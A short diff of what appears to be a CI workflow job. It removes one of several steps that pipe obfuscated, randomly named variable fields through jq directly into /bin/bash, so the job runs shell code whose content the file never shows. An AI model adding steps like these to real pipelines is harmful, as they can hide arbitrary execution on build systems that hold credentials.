@@ -32,7 +32,6 @@ jobs:
           echo $uoskj97886 | jq -r .r8 | /bin/bash
           echo $d40085 | jq -r .ex558 | /bin/bash
           echo $i03894 | jq -r .m075 | /bin/bash
-          echo $dcce6 | jq -r .hljz81917 | /bin/bash
           printf '%s' "$skwn847" | jq -r .kt19234 | /bin/bash
           echo $gqh5018 | jq -r .sovc5682 | /bin/bash
           printf '%s' "$s9" | jq -r .uacdo5 | /bin/bash
